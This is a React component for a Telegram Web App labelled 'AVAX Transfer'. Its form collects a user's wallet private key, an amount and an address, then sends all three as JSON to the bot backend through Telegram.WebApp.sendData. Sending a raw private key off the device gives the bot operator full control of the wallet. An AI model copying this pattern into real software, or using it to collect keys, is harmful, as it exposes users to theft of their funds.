import React, { useState, useEffect } from 'react';
import { Container, Title, SubmitButton } from './styles/GlobalStyle';
import Form from './components/Form';

const App = () => {
  const [privateKey, setPrivateKey] = useState('');
  const [amount, setAmount] = useState('');
  const [address, setAddress] = useState('');

  useEffect(() => {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
      window.Telegram.WebApp.expand();
    } else {
      console.warn("Telegram Web App API is not available. Are you running this outside Telegram?");
    }
  }, []);
  const handleSubmit = (e) => {
    e.preventDefault();
    if (!privateKey || !amount || !address) {
      alert("Please fill out all fields.");
      return;
    }
    const data = JSON.stringify({
      privateKey,
      amount,
      address,
    });
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.sendData(data);
    } else {
      alert("This feature is only available inside Telegram.");
    }
  };

  return (
    <Container>
      <Title>AVAX Transfer</Title>
      <Form
        privateKey={privateKey}
        setPrivateKey={setPrivateKey}
        amount={amount}
        setAmount={setAmount}
        address={address}
        setAddress={setAddress}
        handleSubmit={handleSubmit}
      />
      <SubmitButton type="submit" onClick={handleSubmit}>Submit</SubmitButton>
    </Container>
  );
};

export default App;
